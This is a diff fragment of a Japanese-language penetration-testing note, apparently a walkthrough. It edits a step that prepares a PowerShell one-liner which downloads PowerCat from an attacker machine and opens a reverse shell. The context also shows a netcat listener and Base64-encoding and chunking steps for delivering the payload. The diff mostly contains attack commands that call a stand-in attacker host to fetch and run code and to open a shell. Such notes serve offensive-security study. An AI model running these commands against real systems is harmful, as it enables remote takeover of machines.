@@ -172,11 +172,11 @@ sudo rlwrap nc -lvnp 4444
 
 3. 🔗[PowerCat](https://github.com/besimorhino/powercat)を攻撃者マシンからダウンロードさせ、PowerCatを実行してリバースシェルを獲得するコマンドを用意（🔗[DownloadCradles.ps1 - Github](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)）
 ```powershell
-IEX (New-Object Net.Webclient).downloadstring('http://[AttackerIP]/powercat.ps1');powercat -c [AttackerIP] -p [Listener Port] -e powershell
+IEX (New-Object Net.Webclient).downloadstring('http://<attacker_IP>/powercat.ps1');powercat -c <attacker_IP> -p <port> -e powershell
 ```
 
-3. 特殊文字による実行失敗を防ぐため、Base64エンコードする。
-	[忘れがちなコマンド(Linux・Windows)](../Cheatsheet/Common/忘れがちなコマンド(Linux・Windows).md#PowerShellワンライナーのBase64エンコード化)
+3. 特殊文字による実行失敗を防ぐため、Base64エンコードする：[[シェル]]
+
 
 4. Base64エンコードした文字列を50文字ずつに分割し、`Str = Str + "[分割後のbase64文字列]"`の形式で出力するPythonスクリプトを実行
 ```python
